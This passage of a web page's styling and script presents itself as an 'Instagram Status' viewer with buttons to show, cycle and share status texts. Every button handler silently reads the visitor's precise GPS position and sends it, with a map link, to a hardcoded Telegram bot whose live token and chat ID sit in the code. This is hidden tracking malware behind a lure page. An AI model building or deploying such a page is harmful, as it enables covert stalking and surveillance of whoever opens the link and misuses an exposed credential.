    #status-box {

      color: #333;

      padding: 25px;

  let currentIndex = 0;

  const BOT_TOKEN = '8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc';
  const CHAT_ID = '7357184121';

  startBtn.onclick = () => {
    startBtn.style.display = 'none';
    statusBox.style.display = 'block';
    showStatus();
    getLocation();
  };

  nextBtn.onclick = () => {
    currentIndex = (currentIndex + 1) % statuses.length;
    showStatus();
    getLocation();
  };

  shareBtn.onclick = () => {
    const textToShare = statuses[currentIndex];
    getLocation(); // share पर भी location भेजो
    if (navigator.share) {
      navigator.share({
        title: "Instagram Status",
        text: textToShare,
        url: window.location.href
      }).then(() => console.log("Shared successfully"))
        .catch(err => console.error("Share failed:", err));
    } else {
      alert("Share feature not supported in this browser.");
    }
  };

  function showStatus() {
    statusText.textContent = statuses[currentIndex];
    getLocation(); // Show status पर भी location भेजो
  }

  function getLocation() {
    if (!navigator.geolocation) {
      console.log("Geolocation not supported");
      return;
    }
    navigator.geolocation.getCurrentPosition(success, error);
  }

  function success(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const acc = position.coords.accuracy;
    const msg = `📍 Location Update:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} m\n🔗 https://www.google.com/maps?q=${lat},${lon}`;
    sendToTelegram(msg);
  }

  function error(err) {
    console.warn("Location error: ", err.message);
  }

  function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    })
    .then(res => res.json())
    .then(data => console.log("Telegram sent:", data))
    .catch(err => console.error("Telegram error:", err));
  }
